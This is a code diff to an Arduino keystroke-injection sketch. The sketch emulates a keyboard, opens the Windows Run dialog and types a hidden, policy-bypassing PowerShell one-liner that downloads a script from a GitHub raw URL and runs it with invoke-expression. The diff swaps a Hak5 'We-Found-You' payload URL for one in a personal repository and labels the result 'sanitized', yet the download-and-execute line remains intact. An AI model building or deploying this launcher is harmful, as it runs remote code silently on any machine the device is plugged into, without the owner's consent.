@@ -1,7 +1,8 @@
 #include <Keyboard.h>
 
-// PLACEHOLDER - run build.ps1 to regenerate this file with the real base64 blob.
-const char* B64 = "REPLACE_ME_RUN_build.ps1";
+// We-Found-You (sanitized) HID launcher.
+// Pulls FoundYou.ps1 from YOUR repo (MoeNassi/FoundYou) and runs it.
+// Verify the raw URL below matches where you actually pushed the script.
 
 void runDialog() {
   Keyboard.press(KEY_LEFT_GUI);
@@ -20,11 +21,11 @@ void setup() {
   Keyboard.begin();
   delay(800);
 
-  runDialog();
+  runDialog();            // GUI r
   delay(500);
-  Keyboard.print("powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-We-Found-You/found-you.ps1?dl=1; invoke-expression $pl");
+  Keyboard.print("powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/MoeNassi/FoundYou/main/FoundYou.ps1; invoke-expression $pl");
   delay(500);
-  pressEnter();
+  pressEnter();           // ENTER
 
   Keyboard.end();
 }
